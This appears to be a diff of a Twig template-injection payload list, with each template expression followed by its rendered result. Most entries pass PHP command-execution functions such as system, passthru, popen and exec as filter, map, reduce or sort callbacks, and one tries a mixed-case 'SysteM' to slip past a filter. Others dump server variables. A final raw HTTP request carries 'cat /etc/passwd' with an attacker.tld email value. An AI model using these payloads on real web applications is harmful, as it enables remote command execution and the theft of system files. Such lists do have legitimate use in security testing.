@@ -1,36 +1,46 @@
-<div>
-User Name
-</div>
-<div>
-['id']|filter('system')
-</div>
+<div>User Name</div>
+
+<div>['id']|filter('system')|join</div>
 [&quot;id&quot;]
-<div>
-['touch+/tmp/test+']|filter('system')|join(',')
-</div>
+
+<div>['echo']|filter('passthru')|join</div>
+[&quot;echo&quot;]
+
+<div>['echo']|filter('popen')|join</div>
+[&quot;echo&quot;]
+
+<div>['echo']|filter('exec')|join</div>
+[&quot;echo&quot;]
+
+<div>['id']|filter('SysteM')|join</div>
+[&quot;id&quot;]
+
+<div>['touch+/tmp/test+']|filter('system')|join(',')</div>
 [&quot;touch+\/tmp\/test+&quot;]
-<div>
-set sizes = [34, 36, 38, 40, 42]
-sizes|filter(v => v > 38)|join(', ')
-</div>
+
+<div>[34, 36, 38, 40, 42]|filter(v => v > 38)|join(', ')</div>
 40, 42
-<div>
-app.request.server.all|join(',')
-</div>
- <div>
-self
-</div>
- <div>
-[0]|reduce('system','echo')
-</div>
+
+<div>app.request.server.all|join(',')</div>
+
+
+<div>self</div>
+
+
+<div>[0]|reduce('system','echo')</div>
+[0]
+
+<div>[1, 2, 3]|reduce((carry, v) => carry + v)</div>
+6
+
+<div>['echo']|map('system')|join</div>
 [&quot;echo&quot;]
-<div>
-['echo']|map('system')|join
-</div>
-[&quot;echo&quot;]
-<div>
-['echo',1]|sort('system')|join
-</div>
-echo1
+
+<div>{"Bob": "Smith", "Alice": "Dupond"}|map((value, key) => "#{key} #{value}")|join(', ')</div>
+Bob Smith, Alice Dupond
+
+<div>['echo',1]|sort('system')|join</div>
+[&quot;echo&quot;,1]
+
 POST /subscribe?0=cat+/etc/passwd HTTP/1.1
 email=""@attacker.tld
